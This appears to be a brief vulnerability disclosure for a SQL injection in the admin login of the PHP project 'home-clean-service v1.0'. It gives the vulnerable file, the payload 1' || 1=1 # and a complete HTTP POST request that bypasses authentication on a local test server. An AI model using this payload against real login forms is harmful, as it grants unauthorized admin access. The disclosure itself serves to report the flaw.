# home-clean-service v1.0 has SQL injection

vendors: https://www.sourcecodester.com/php/15293/home-clean-service-free-source-code.html

Date: 2022-05-07

Vulnerability File: /hcs/public_html/admin/login.php

Vulnerability location:/hcs/public_html/admin/login.php, password

[+] Payload: 1%27+%7C%7C+1%3D1+%23

Tested on Windows 10, XAMPP

```
POST http://192.168.2.106/hcs/public_html/admin/login.php HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/hcs/public_html/admin/index.php
Upgrade-Insecure-Requests: 1

username=admin&password=1%27+%7C%7C+1%3D1+%23&login=
```

![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)

